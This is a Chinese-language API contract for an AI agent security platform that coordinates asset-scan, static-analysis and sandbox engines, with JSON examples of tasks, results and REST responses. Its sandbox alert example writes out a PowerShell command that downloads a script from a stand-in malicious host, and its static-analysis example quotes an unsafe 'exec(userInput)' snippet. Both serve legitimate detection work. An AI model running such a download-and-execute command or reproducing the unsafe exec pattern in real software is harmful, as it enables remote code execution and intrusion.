# API Contract v1

## 1. 文档范围

本文档定义 `agent-security-platform` 第一版 API 契约，目标是支撑以下三类协作场景：

- 前端与后端联调
- 后端与三个检测引擎集成
- 平台对任务、结果、日志、风险摘要进行统一存储与展示

当前版本聚焦“最小可联调闭环”，不追求一次覆盖完整业务系统。核心设计原则是以 `Task` 为中心组织任务流，以统一外层结果结构承载三类引擎输出。

## 2. 设计原则

### 2.1 为什么采用 Task 驱动

平台的核心不是直接暴露某个引擎能力，而是统一管理检测任务的生命周期。采用 `Task` 驱动有以下好处：

- 前端调用方式统一。无论是资产测绘、静态分析还是动态沙箱，前端都先创建任务，再查询状态和结果。
- 后端编排方式统一。后端只需要围绕任务创建、调度、状态更新、结果归档来组织主流程。
- 引擎接入方式统一。不同引擎只要能接收任务上下文并返回标准结果，就可以被平台编排。
- 平台展示方式统一。任务列表、执行日志、结果详情、风险摘要都可以围绕 `task_id` 聚合。

### 2.2 为什么三个引擎要统一外层结构

三个引擎的内部实现可以完全不同，但外层结构必须统一，原因如下：

- 前端不需要理解不同引擎的私有协议。
- 后端可以用统一的任务中心、日志中心、结果中心承接不同能力。
- 风险等级、任务状态、时间字段、摘要字段可以跨引擎统一展示和统计。
- 后续如果某个引擎重构、拆服务或替换语言，只要外层契约不变，平台层改动成本就会显著降低。

### 2.3 为什么先统一输出格式，再逐步细化调用方式

在项目第一阶段，最容易阻塞协作的并不是“调用方式是否完美”，而是“结果格式是否一致”。因此本版契约优先统一：

- 任务对象结构
- 结果对象结构
- 风险等级和状态枚举
- 平台统一响应格式

对于引擎与后端的具体调用方式，例如 HTTP 同步调用、异步队列、内部 SDK、回调上报、轮询拉取，本阶段暂不强绑定。这样做可以让 3 人团队先跑通主流程，再根据实际性能和部署要求细化接入模式。

## 3. 通用枚举与约定

### 3.1 命名与格式约定

- API 请求与响应中的 JSON 字段统一使用 `snake_case`
- 枚举值统一使用小写英文和下划线
- 时间字段统一使用 ISO 8601 字符串，例如 `2026-04-01T09:30:00Z`
- 所有 ID 字段统一使用字符串，不在 API 层暴露自增整数
- 第一版接口不引入分页、排序、筛选等复杂协议，先保证主流程稳定
- 当前第一版共享契约以 `shared/` 中的 TypeScript 定义和运行时规范化函数为准，文档与代码应保持一致
- 当前工程基线先冻结为 `pnpm workspace`、`Node.js 22.17.0`、`TypeScript strict`，用于支撑平台骨架阶段的契约开发与测试

### 3.2 TaskType

| 枚举值 | 含义 | 说明 |
| --- | --- | --- |
| `asset_scan` | 资产测绘任务 | 用于 Agent 资产识别、开放面探测、指纹识别 |
| `static_analysis` | 静态分析任务 | 用于 Skills 包、脚本、依赖和配置的静态安全检测 |
| `sandbox_run` | 动态沙箱任务 | 用于运行时监控、越权行为检测和阻断 |

### 3.3 TaskStatus

| 枚举值 | 含义 | 说明 |
| --- | --- | --- |
| `pending` | 待执行 | 任务已创建，尚未开始执行 |
| `running` | 执行中 | 已分发至引擎，正在执行 |
| `finished` | 已完成 | 任务执行完成，结果可查询 |
| `failed` | 执行失败 | 引擎执行失败或平台处理失败 |
| `blocked` | 已阻断 | 主要用于动态沙箱中触发高危动作后的阻断状态 |
| `partial_success` | 部分成功 | 部分结果已产出，但存在步骤失败或数据缺失 |

### 3.4 EngineType

| 枚举值 | 含义 | 说明 |
| --- | --- | --- |
| `asset_scan` | 资产扫描引擎 | 对应 `engines/asset-scan` |
| `skills_static` | Skills 静态分析引擎 | 对应 `engines/skills-static` |
| `sandbox` | 沙箱引擎 | 对应 `engines/sandbox` |

### 3.5 RiskLevel

| 枚举值 | 含义 | 说明 |
| --- | --- | --- |
| `info` | 提示信息 | 仅提示，不构成直接风险 |
| `low` | 低风险 | 风险较低，建议关注 |
| `medium` | 中风险 | 需要进入排查和修复流程 |
| `high` | 高风险 | 需要优先处理 |
| `critical` | 严重风险 | 需要立即处理或阻断 |

## 4. 通用对象

### 4.1 Task

`Task` 是平台层统一的任务对象。前端创建任务、后端调度执行、引擎返回结果、平台查询展示，全部围绕 `task_id` 展开。

当前 `Task` 契约还要求 `task_type` 与 `engine_type` 之间满足固定映射关系：

- `asset_scan` -> `asset_scan`
- `static_analysis` -> `skills_static`
- `sandbox_run` -> `sandbox`

#### 字段定义

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `task_id` | string | 是 | 平台生成的任务唯一标识 |
| `task_type` | string | 是 | 任务类型，取值见 `TaskType` |
| `engine_type` | string | 是 | 执行引擎类型，取值见 `EngineType` |
| `status` | string | 是 | 任务状态，取值见 `TaskStatus` |
| `title` | string | 是 | 任务标题，面向页面展示和日志定位 |
| `requested_by` | string | 否 | 任务发起人标识 |
| `target` | object | 是 | 任务目标对象 |
| `parameters` | object | 否 | 任务参数，按任务类型扩展 |
| `risk_level` | string | 否 | 当前任务汇总风险等级 |
| `summary` | string | 否 | 任务摘要说明 |
| `result_ref` | object | 否 | 任务结果引用信息 |
| `error_message` | string | 否 | 任务失败或异常说明 |
| `created_at` | string | 是 | 创建时间 |
| `updated_at` | string | 是 | 最近更新时间 |
| `started_at` | string | 否 | 实际开始执行时间 |
| `finished_at` | string | 否 | 实际完成时间 |
| `metadata` | object | 否 | 平台保留扩展字段 |

#### target 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `target_type` | string | 是 | 目标类型，例如 `url`、`repo`、`skill_package`、`session` |
| `target_value` | string | 是 | 目标标识值 |
| `display_name` | string | 否 | 展示名称 |
| `location` | string | 否 | 目标位置，例如文件路径、仓库地址、环境标识 |
| `metadata` | object | 否 | 与目标相关的补充上下文 |

#### result_ref 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `result_type` | string | 是 | 结果类型，例如 `asset_scan_result` |
| `result_id` | string | 是 | 结果唯一标识 |

#### JSON 示例

```json
{
  "task_id": "task_20260401_0001",
  "task_type": "asset_scan",
  "engine_type": "asset_scan",
  "status": "running",
  "title": "Scan demo public agent",
  "requested_by": "alice",
  "target": {
    "target_type": "url",
    "target_value": "https://demo-agent.example.com",
    "display_name": "Demo Agent",
    "location": "public-internet"
  },
  "parameters": {
    "enable_http_probe": true,
    "enable_port_scan": true,
    "timeout_seconds": 60
  },
  "risk_level": "medium",
  "summary": "Target discovered and fingerprinting is in progress",
  "created_at": "2026-04-01T09:30:00Z",
  "updated_at": "2026-04-01T09:31:10Z",
  "started_at": "2026-04-01T09:30:08Z",
  "metadata": {
    "workspace": "default"
  }
}
```

### 4.2 BaseResult

`BaseResult` 是三类结果对象的公共外层结构。第一版共享契约要求所有结果先收敛成统一外层，再通过 `details` 承载任务类型对应的细节字段。这样前端和后端都可以先依赖稳定的结果壳，再逐步细化三类任务的详情结构。

#### 字段定义

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `task_id` | string | 是 | 关联任务 ID |
| `task_type` | string | 是 | 关联任务类型 |
| `engine_type` | string | 是 | 产生结果的引擎类型 |
| `status` | string | 是 | 结果对应的执行状态 |
| `risk_level` | string | 是 | 结果汇总风险等级 |
| `summary` | string | 是 | 结果摘要 |
| `details` | object | 是 | 结果细节对象，按 `task_type` 承载不同结构 |
| `created_at` | string | 是 | 结果创建时间 |
| `updated_at` | string | 是 | 最近更新时间 |
| `result_id` | string | 否 | 结果对象唯一标识，后续落库或归档时可补齐 |
| `started_at` | string | 否 | 该结果对应执行开始时间 |
| `finished_at` | string | 否 | 该结果对应执行完成时间 |
| `metadata` | object | 否 | 保留扩展字段 |

#### JSON 示例

```json
{
  "task_id": "task_20260401_0001",
  "task_type": "asset_scan",
  "engine_type": "asset_scan",
  "status": "finished",
  "risk_level": "high",
  "summary": "Detected 2 open management endpoints and missing authentication",
  "details": {
    "target": {
      "target_type": "url",
      "target_value": "https://demo-agent.example.com",
      "display_name": "Demo Agent"
    },
    "findings": [
      {
        "title": "Management endpoint exposed",
        "risk_level": "high"
      }
    ]
  },
  "created_at": "2026-04-01T09:30:12Z",
  "updated_at": "2026-04-01T09:31:30Z"
}
```

#### details 细化约定

- `asset_scan`：`details` 主要承载 `target`、`fingerprint`、`matched_features`、`open_ports`、`http_endpoints`、`auth_detected`、`findings`
- `static_analysis`：`details` 主要承载 `sample_name`、`language`、`entry_files`、`files_scanned`、`rule_hits`、`sensitive_capabilities`、`dependency_summary`
- `sandbox_run`：`details` 主要承载 `session_id`、`target`、`alerts`、`blocked`、`event_count`

第一版共享规范化逻辑会剥离结果外层和 `details` 中未声明的私有字段，避免把引擎内部调试数据直接泄露到平台 API 或前端页面。

#### 与具体结果对象的关系

本文件第 5 章中保留三类结果对象的业务字段说明，用于解释各任务类型的细节结构；在实际共享契约中，这些细节字段都应投影到 `BaseResult.details` 下，而不是各自再定义一套不同的结果外层。

```json
{
  "result_id": "result_asset_0001",
  "task_id": "task_20260401_0001",
  "task_type": "asset_scan",
  "engine_type": "asset_scan",
  "status": "finished",
  "risk_level": "high",
  "summary": "Detected 2 open management endpoints and missing authentication",
  "details": {
    "target": {
      "target_type": "url",
      "target_value": "https://demo-agent.example.com",
      "display_name": "Demo Agent"
    },
    "fingerprint": {
      "agent_name": "demo-agent",
      "framework": "langchain"
    },
    "findings": [
      {
        "title": "Management endpoint exposed",
        "risk_level": "high"
      }
    ]
  },
  "started_at": "2026-04-01T09:30:08Z",
  "finished_at": "2026-04-01T09:31:28Z"
}
```

### 4.3 RiskSummary

`RiskSummary` 用于统一描述任务级风险汇总，供任务详情页、统计卡片和汇总列表直接使用。

#### 字段定义

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `task_id` | string | 是 | 关联任务 ID |
| `task_type` | string | 是 | 任务类型 |
| `status` | string | 是 | 当前任务状态 |
| `risk_level` | string | 是 | 汇总后的任务风险等级 |
| `summary` | string | 是 | 风险摘要 |
| `total_findings` | number | 是 | 总发现数或总告警数 |
| `info_count` | number | 是 | 信息级数量 |
| `low_count` | number | 是 | 低风险数量 |
| `medium_count` | number | 是 | 中风险数量 |
| `high_count` | number | 是 | 高风险数量 |
| `critical_count` | number | 是 | 严重风险数量 |
| `blocked_count` | number | 否 | 阻断数量，主要用于沙箱任务 |
| `top_risks` | string[] | 否 | 重点风险摘要列表 |
| `updated_at` | string | 是 | 最近更新时间 |

#### JSON 示例

```json
{
  "task_id": "task_20260401_0001",
  "task_type": "asset_scan",
  "status": "finished",
  "risk_level": "high",
  "summary": "1 high risk finding and 2 medium risk findings detected",
  "total_findings": 3,
  "info_count": 0,
  "low_count": 0,
  "medium_count": 2,
  "high_count": 1,
  "critical_count": 0,
  "blocked_count": 0,
  "top_risks": [
    "Management endpoint exposed without authentication",
    "Debug interface is publicly reachable"
  ],
  "updated_at": "2026-04-01T09:31:30Z"
}
```

## 5. 三类核心结果对象

### 5.1 AssetScanResult

`AssetScanResult` 用于描述资产测绘与指纹识别的输出结果。

#### 字段定义

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `result_id` | string | 是 | 结果唯一标识 |
| `task_id` | string | 是 | 关联任务 ID |
| `task_type` | string | 是 | 固定为 `asset_scan` |
| `engine_type` | string | 是 | 固定为 `asset_scan` |
| `status` | string | 是 | 结果状态 |
| `risk_level` | string | 是 | 汇总风险等级 |
| `summary` | string | 是 | 结果摘要 |
| `target` | object | 是 | 资产目标信息 |
| `fingerprint` | object | 是 | 指纹识别信息 |
| `confidence` | number | 是 | 指纹识别置信度，范围建议为 `0` 到 `1` |
| `matched_features` | string[] | 否 | 命中的指纹特征列表 |
| `open_ports` | array | 否 | 探测到的开放端口 |
| `http_endpoints` | array | 否 | 探测到的 HTTP 接口或路径 |
| `auth_detected` | boolean | 是 | 是否识别到认证机制 |
| `findings` | array | 否 | 资产风险发现列表 |
| `created_at` | string | 是 | 结果创建时间 |
| `updated_at` | string | 是 | 最近更新时间 |
| `started_at` | string | 否 | 执行开始时间 |
| `finished_at` | string | 否 | 执行完成时间 |
| `metadata` | object | 否 | 资产扫描扩展字段 |

#### fingerprint 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `agent_name` | string | 否 | 识别出的 Agent 名称 |
| `framework` | string | 否 | 识别出的框架 |
| `model_provider` | string | 否 | 模型供应商 |
| `runtime` | string | 否 | 运行时环境 |
| `version` | string | 否 | 版本信息 |

#### open_ports 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `port` | number | 是 | 端口号 |
| `protocol` | string | 是 | 协议，例如 `tcp` |
| `service` | string | 否 | 识别出的服务名 |
| `status` | string | 否 | 端口状态，例如 `open` |

#### http_endpoints 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `method` | string | 是 | 请求方法 |
| `path` | string | 是 | 路径 |
| `status_code` | number | 否 | 探测返回状态码 |
| `auth_required` | boolean | 否 | 是否需要认证 |
| `description` | string | 否 | 说明 |

#### findings 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `title` | string | 是 | 风险标题 |
| `risk_level` | string | 是 | 风险等级 |
| `reason` | string | 是 | 风险原因 |
| `evidence` | string[] | 否 | 证据列表 |
| `recommendation` | string | 否 | 修复建议 |

#### JSON 示例

```json
{
  "result_id": "result_asset_0001",
  "task_id": "task_20260401_0001",
  "task_type": "asset_scan",
  "engine_type": "asset_scan",
  "status": "finished",
  "risk_level": "high",
  "summary": "Detected exposed management endpoints and missing authentication",
  "target": {
    "target_type": "url",
    "target_value": "https://demo-agent.example.com",
    "display_name": "Demo Agent"
  },
  "fingerprint": {
    "agent_name": "demo-agent",
    "framework": "langchain",
    "model_provider": "openai",
    "runtime": "nodejs",
    "version": "0.9.3"
  },
  "confidence": 0.93,
  "matched_features": [
    "x-agent-framework: langchain",
    "/api/agent/status endpoint detected",
    "OpenAI compatible response pattern"
  ],
  "open_ports": [
    {
      "port": 80,
      "protocol": "tcp",
      "service": "http",
      "status": "open"
    },
    {
      "port": 443,
      "protocol": "tcp",
      "service": "https",
      "status": "open"
    }
  ],
  "http_endpoints": [
    {
      "method": "GET",
      "path": "/health",
      "status_code": 200,
      "auth_required": false,
      "description": "Health check endpoint"
    },
    {
      "method": "GET",
      "path": "/api/admin/config",
      "status_code": 200,
      "auth_required": false,
      "description": "Management configuration endpoint"
    }
  ],
  "auth_detected": false,
  "findings": [
    {
      "title": "Management endpoint exposed",
      "risk_level": "high",
      "reason": "Sensitive management endpoint is reachable without authentication",
      "evidence": [
        "GET /api/admin/config -> 200",
        "No authentication challenge observed"
      ],
      "recommendation": "Restrict management endpoints and enforce authentication"
    }
  ],
  "created_at": "2026-04-01T09:30:12Z",
  "updated_at": "2026-04-01T09:31:30Z",
  "started_at": "2026-04-01T09:30:08Z",
  "finished_at": "2026-04-01T09:31:28Z"
}
```

### 5.2 StaticAnalysisResult

`StaticAnalysisResult` 用于描述 Skills 静态安全检测结果。

#### 字段定义

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `result_id` | string | 是 | 结果唯一标识 |
| `task_id` | string | 是 | 关联任务 ID |
| `task_type` | string | 是 | 固定为 `static_analysis` |
| `engine_type` | string | 是 | 固定为 `skills_static` |
| `status` | string | 是 | 结果状态 |
| `risk_level` | string | 是 | 汇总风险等级 |
| `summary` | string | 是 | 结果摘要 |
| `sample_name` | string | 是 | 样本或 Skills 包名称 |
| `language` | string | 是 | 主语言类型 |
| `entry_files` | string[] | 否 | 入口文件列表 |
| `files_scanned` | number | 否 | 已扫描文件数 |
| `rule_hits` | array | 是 | 规则命中列表 |
| `sensitive_capabilities` | string[] | 否 | 检测到的敏感能力列表 |
| `dependency_summary` | object | 否 | 依赖统计摘要 |
| `created_at` | string | 是 | 结果创建时间 |
| `updated_at` | string | 是 | 最近更新时间 |
| `started_at` | string | 否 | 执行开始时间 |
| `finished_at` | string | 否 | 执行完成时间 |
| `metadata` | object | 否 | 静态分析扩展字段 |

#### rule_hits 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `rule_id` | string | 是 | 规则唯一标识 |
| `rule_name` | string | 是 | 规则名称 |
| `severity` | string | 是 | 风险严重度，建议与 `RiskLevel` 对齐 |
| `file` | string | 是 | 命中文件路径 |
| `line_start` | number | 否 | 起始行号 |
| `line_end` | number | 否 | 结束行号 |
| `reason` | string | 是 | 命中原因 |
| `snippet` | string | 否 | 相关代码片段摘要 |
| `recommendation` | string | 否 | 修复建议 |

#### dependency_summary 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `total_dependencies` | number | 否 | 总依赖数量 |
| `risky_dependencies` | number | 否 | 风险依赖数量 |
| `unknown_dependencies` | number | 否 | 未识别依赖数量 |

#### JSON 示例

```json
{
  "result_id": "result_static_0001",
  "task_id": "task_20260401_0002",
  "task_type": "static_analysis",
  "engine_type": "skills_static",
  "status": "finished",
  "risk_level": "critical",
  "summary": "Detected command execution and unrestricted file write behaviors",
  "sample_name": "demo-email-skill",
  "language": "typescript",
  "entry_files": [
    "src/index.ts"
  ],
  "files_scanned": 12,
  "rule_hits": [
    {
      "rule_id": "SK001",
      "rule_name": "dangerous-command-execution",
      "severity": "critical",
      "file": "src/index.ts",
      "line_start": 18,
      "line_end": 21,
      "reason": "User-controlled input is passed into shell execution",
      "snippet": "exec(userInput)",
      "recommendation": "Remove shell execution or strictly validate command input"
    },
    {
      "rule_id": "SK014",
      "rule_name": "unrestricted-file-write",
      "severity": "high",
      "file": "src/utils/export.ts",
      "line_start": 42,
      "line_end": 48,
      "reason": "Arbitrary file path is accepted without allowlist restriction",
      "recommendation": "Restrict writable directories and validate file path"
    }
  ],
  "sensitive_capabilities": [
    "command_execution",
    "file_write",
    "outbound_network"
  ],
  "dependency_summary": {
    "total_dependencies": 18,
    "risky_dependencies": 1,
    "unknown_dependencies": 2
  },
  "created_at": "2026-04-01T10:10:00Z",
  "updated_at": "2026-04-01T10:10:30Z",
  "started_at": "2026-04-01T10:09:58Z",
  "finished_at": "2026-04-01T10:10:28Z"
}
```

### 5.3 SandboxAlert

`SandboxAlert` 在第一版中表示一次沙箱任务的告警结果对象，包含一个 `session_id` 及其下的多条告警记录。

#### 顶层字段定义

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `result_id` | string | 是 | 结果唯一标识 |
| `task_id` | string | 是 | 关联任务 ID |
| `task_type` | string | 是 | 固定为 `sandbox_run` |
| `engine_type` | string | 是 | 固定为 `sandbox` |
| `status` | string | 是 | 结果状态 |
| `risk_level` | string | 是 | 汇总风险等级 |
| `summary` | string | 是 | 结果摘要 |
| `session_id` | string | 是 | 沙箱运行会话 ID |
| `target` | object | 否 | 运行目标描述 |
| `alerts` | array | 是 | 告警列表 |
| `blocked` | boolean | 否 | 本次会话是否触发阻断 |
| `event_count` | number | 否 | 总事件数 |
| `created_at` | string | 是 | 结果创建时间 |
| `updated_at` | string | 是 | 最近更新时间 |
| `started_at` | string | 否 | 执行开始时间 |
| `finished_at` | string | 否 | 执行完成时间 |
| `metadata` | object | 否 | 沙箱结果扩展字段 |

#### alerts 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `alert_id` | string | 是 | 告警唯一标识 |
| `event_type` | string | 是 | 事件类型，例如 `command_execution` |
| `action` | string | 是 | 系统动作，例如 `allow`、`alert`、`block` |
| `resource` | string | 是 | 访问对象，例如文件、网络地址、命令 |
| `evidence` | array | 否 | 证据列表 |
| `timestamp` | string | 是 | 告警时间 |
| `reason` | string | 是 | 告警原因 |
| `risk_level` | string | 是 | 告警等级 |
| `policy_id` | string | 否 | 命中的策略 ID |
| `policy_name` | string | 否 | 命中的策略名称 |
| `process_name` | string | 否 | 触发事件的进程名 |

#### evidence 子对象

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `key` | string | 是 | 证据键 |
| `value` | string | 是 | 证据值 |

#### JSON 示例

```json
{
  "result_id": "result_sandbox_0001",
  "task_id": "task_20260401_0003",
  "task_type": "sandbox_run",
  "engine_type": "sandbox",
  "status": "blocked",
  "risk_level": "critical",
  "summary": "High-risk command execution was detected and blocked",
  "session_id": "session_demo_001",
  "target": {
    "target_type": "session",
    "target_value": "demo-agent-run",
    "display_name": "Demo Agent Runtime Session"
  },
  "alerts": [
    {
      "alert_id": "alert_0001",
      "event_type": "command_execution",
      "action": "block",
      "resource": "cmd.exe /c powershell Invoke-WebRequest http://malicious.example/payload.ps1",
      "evidence": [
        {
          "key": "process_tree",
          "value": "agent.exe -> cmd.exe -> powershell.exe"
        },
        {
          "key": "destination",
          "value": "http://malicious.example/payload.ps1"
        }
      ],
      "timestamp": "2026-04-01T11:00:12Z",
      "reason": "Untrusted runtime attempted to download and execute a remote script",
      "risk_level": "critical",
      "policy_id": "SB-POL-001",
      "policy_name": "block-remote-script-execution",
      "process_name": "powershell.exe"
    },
    {
      "alert_id": "alert_0002",
      "event_type": "file_write",
      "action": "alert",
      "resource": "C:\\Users\\Public\\startup.bat",
      "evidence": [
        {
          "key": "write_mode",
          "value": "create"
        }
      ],
      "timestamp": "2026-04-01T11:00:08Z",
      "reason": "Suspicious write to startup path",
      "risk_level": "high",
      "policy_id": "SB-POL-010",
      "policy_name": "monitor-startup-path-write",
      "process_name": "agent.exe"
    }
  ],
  "blocked": true,
  "event_count": 17,
  "created_at": "2026-04-01T11:00:00Z",
  "updated_at": "2026-04-01T11:00:15Z",
  "started_at": "2026-04-01T10:59:56Z",
  "finished_at": "2026-04-01T11:00:14Z"
}
```

## 6. 第一版 REST API

### 6.1 统一说明

当前仓库已落地的第一版 REST API 只定义平台对前端暴露的最小联调接口，默认由后端对三个引擎完成内部调度。

约定如下：

- 当前 `REQ-02` 已实现的接口包括：
  - `GET /health`
  - `POST /api/tasks`
  - `GET /api/tasks`
  - `GET /api/tasks/:taskId`
  - `GET /api/tasks/:taskId/result`
  - `GET /api/tasks/:taskId/risk-summary`
- 创建任务接口在任务成功写入内存仓库后立即返回 `Task`
- 创建成功后默认返回 HTTP `201`
- 查询成功返回 HTTP `200`
- 参数错误返回 HTTP `400`
- 未找到任务返回 HTTP `404`
- 服务内部异常返回 HTTP `500`
- 当前最小任务中枢会在创建任务时同步生成初始 `BaseResult` 与初始 `RiskSummary` 占位对象，因此 `GET /result` 与 `GET /risk-summary` 在 `pending` 状态下也返回 `200`

### 6.2 GET /health

#### 用途

健康检查，用于本地联调与后续部署探活。

#### 返回结构

```json
{
  "success": true,
  "message": "Service is healthy",
  "data": {
    "status": "ok"
  },
  "error_code": null,
  "request_id": "req_000001"
}
```

### 6.3 POST /api/tasks

#### 用途

创建统一任务。当前通过 `task_type` 区分 `asset_scan`、`static_analysis`、`sandbox_run` 三类任务。

#### 请求参数

```json
{
  "task_type": "asset_scan",
  "title": "Scan demo public agent",
  "requested_by": "alice",
  "target": {
    "target_type": "url",
    "target_value": "https://demo-agent.example.com",
    "display_name": "Demo Agent"
  }
}
```

#### 返回结构

- `data` 返回 `Task`

#### 成功示例

```json
{
  "success": true,
  "message": "Task created successfully",
  "data": {
    "task_id": "task_20260401_0001",
    "task_type": "asset_scan",
    "engine_type": "asset_scan",
    "status": "pending",
    "title": "Scan demo public agent",
    "requested_by": "alice",
    "target": {
      "target_type": "url",
      "target_value": "https://demo-agent.example.com",
      "display_name": "Demo Agent"
    },
    "parameters": {
      "enable_http_probe": true,
      "enable_port_scan": true,
      "timeout_seconds": 60
    },
    "risk_level": "info",
    "summary": "Task accepted and waiting for engine dispatch",
    "created_at": "2026-04-01T09:30:00Z",
    "updated_at": "2026-04-01T09:30:00Z"
  },
  "error_code": null,
  "request_id": "req_9aef001"
}
```

#### 失败示例

```json
{
  "success": false,
  "message": "Invalid task creation request",
  "data": null,
  "error_code": "INVALID_REQUEST",
  "request_id": "req_9aef002"
}
```

### 6.4 GET /api/tasks

#### 用途

查询当前内存仓库中的任务列表。

#### 返回结构

- `data` 返回 `Task[]`

#### 成功示例

```json
{
  "success": true,
  "message": "Tasks fetched successfully",
  "data": [
    {
      "task_id": "task_20260401_0001",
      "task_type": "asset_scan",
      "engine_type": "asset_scan",
      "status": "pending",
      "title": "Scan demo public agent",
      "target": {
        "target_type": "url",
        "target_value": "https://demo-agent.example.com",
        "display_name": "Demo Agent"
      },
      "risk_level": "info",
      "summary": "Task accepted and waiting for engine dispatch",
      "created_at": "2026-04-01T09:30:00Z",
      "updated_at": "2026-04-01T09:30:00Z"
    },
    {
      "task_id": "task_20260401_0002",
      "task_type": "static_analysis",
      "engine_type": "skills_static",
      "status": "pending",
      "title": "Analyze demo email skill",
      "target": {
        "target_type": "skill_package",
        "target_value": "samples/skills/demo-email-skill",
        "display_name": "demo-email-skill"
      },
      "risk_level": "info",
      "summary": "Task accepted and waiting for engine dispatch",
      "created_at": "2026-04-01T10:00:00Z",
      "updated_at": "2026-04-01T10:00:00Z"
    }
  ],
  "error_code": null,
  "request_id": "req_9aef010"
}
```

### 6.5 GET /api/tasks/:taskId

查询任务详情与当前状态。

#### 路径参数

| 参数 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `taskId` | string | 是 | 任务 ID |

#### 返回结构

- `data` 返回 `Task`

#### 成功示例

```json
{
  "success": true,
  "message": "Task fetched successfully",
  "data": {
    "task_id": "task_20260401_0002",
    "task_type": "static_analysis",
    "engine_type": "skills_static",
    "status": "pending",
    "title": "Analyze demo email skill",
    "requested_by": "alice",
    "target": {
      "target_type": "skill_package",
      "target_value": "samples/skills/demo-email-skill",
      "display_name": "demo-email-skill"
    },
    "parameters": {
      "language": "typescript",
      "rule_pack": "default-v1",
      "include_dependencies": true
    },
    "risk_level": "info",
    "summary": "Task accepted and waiting for engine dispatch",
    "created_at": "2026-04-01T10:00:00Z",
    "updated_at": "2026-04-01T10:00:00Z"
  },
  "error_code": null,
  "request_id": "req_9aef100"
}
```

#### 失败示例

```json
{
  "success": false,
  "message": "Task not found",
  "data": null,
  "error_code": "TASK_NOT_FOUND",
  "request_id": "req_9aef101"
}
```

### 6.6 GET /api/tasks/:taskId/result

#### 用途

查询任务结果详情。当前最小后端骨架会在创建任务时同步生成统一 `BaseResult` 外层，并将任务细节放入 `details`。

#### 路径参数

| 参数 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `taskId` | string | 是 | 任务 ID |

#### 返回结构

```json
{
  "task_id": "task_20260401_0001",
  "task_type": "asset_scan",
  "engine_type": "asset_scan",
  "status": "pending",
  "risk_level": "info",
  "summary": "Task accepted and waiting for engine dispatch",
  "details": {}
}
```

#### 成功示例

```json
{
  "success": true,
  "message": "Task result fetched successfully",
  "data": {
    "task_id": "task_20260401_0001",
    "task_type": "asset_scan",
    "engine_type": "asset_scan",
    "status": "pending",
    "risk_level": "info",
    "summary": "Task accepted and waiting for engine dispatch",
    "details": {
      "target": {
        "target_type": "url",
        "target_value": "https://demo-agent.example.com",
        "display_name": "Demo Agent"
      },
      "findings": [
      ]
    },
    "created_at": "2026-04-01T09:30:12Z",
    "updated_at": "2026-04-01T09:30:12Z"
  },
  "error_code": null,
  "request_id": "req_9aef110"
}
```

#### 失败示例

```json
{
  "success": false,
  "message": "Task not found",
  "data": null,
  "error_code": "TASK_NOT_FOUND",
  "request_id": "req_9aef111"
}
```

### 6.7 GET /api/tasks/:taskId/risk-summary

#### 用途

查询任务级风险汇总，便于前端在列表页和详情页快速展示风险概况。

#### 路径参数

| 参数 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `taskId` | string | 是 | 任务 ID |

#### 返回结构

- `data` 返回 `RiskSummary`

#### 成功示例

```json
{
  "success": true,
  "message": "Risk summary fetched successfully",
  "data": {
    "task_id": "task_20260401_0001",
    "task_type": "asset_scan",
    "status": "pending",
    "risk_level": "info",
    "summary": "Task accepted and waiting for engine dispatch",
    "total_findings": 0,
    "info_count": 0,
    "low_count": 0,
    "medium_count": 0,
    "high_count": 0,
    "critical_count": 0,
    "updated_at": "2026-04-01T09:30:12Z"
  },
  "error_code": null,
  "request_id": "req_9aef130"
}
```

#### 失败示例

```json
{
  "success": false,
  "message": "Task not found",
  "data": null,
  "error_code": "TASK_NOT_FOUND",
  "request_id": "req_9aef131"
}
```

### 6.8 保留接口：GET /api/tasks/:taskId/logs

当前该接口仍处于文档保留状态，尚未在 `REQ-02` 中实现。后续如果任务中心开始接入真实调度与执行日志，再补充日志对象契约与接口测试。

## 7. 统一返回格式

### 7.1 返回结构

平台对前端暴露的第一版接口统一采用如下外层返回格式：

```json
{
  "success": true,
  "message": "Task fetched successfully",
  "data": {},
  "error_code": null,
  "request_id": "req_9aef100"
}
```

### 7.2 字段说明

| 字段 | 类型 | 必填 | 含义 |
| --- | --- | --- | --- |
| `success` | boolean | 是 | 是否成功 |
| `message` | string | 是 | 面向调用方的简要说明 |
| `data` | object \| array \| null | 是 | 实际返回数据 |
| `error_code` | string \| null | 是 | 统一错误码，成功时为 `null` |
| `request_id` | string | 是 | 请求追踪 ID，用于日志定位和排障 |

### 7.3 推荐原因

- 前端处理成本低，所有接口都有统一的成功与失败外层结构。
- 后端便于接入统一日志与错误码体系。
- 出现联调问题时，可以通过 `request_id` 快速关联平台日志和引擎日志。
- 后续扩展国际化消息、错误码映射、审计记录时，外层协议不需要变更。

### 7.4 推荐错误码

| 错误码 | 说明 |
| --- | --- |
| `INVALID_REQUEST` | 请求格式不合法 |
| `INVALID_TARGET` | 目标参数不合法 |
| `UNSUPPORTED_RULE_PACK` | 不支持的规则集 |
| `MISSING_SANDBOX_PROFILE` | 缺少沙箱策略配置 |
| `TASK_NOT_FOUND` | 任务不存在 |
| `RESULT_NOT_READY` | 结果尚未生成 |
| `RISK_SUMMARY_NOT_AVAILABLE` | 风险摘要尚不可用 |
| `ENGINE_DISPATCH_FAILED` | 引擎分发失败 |
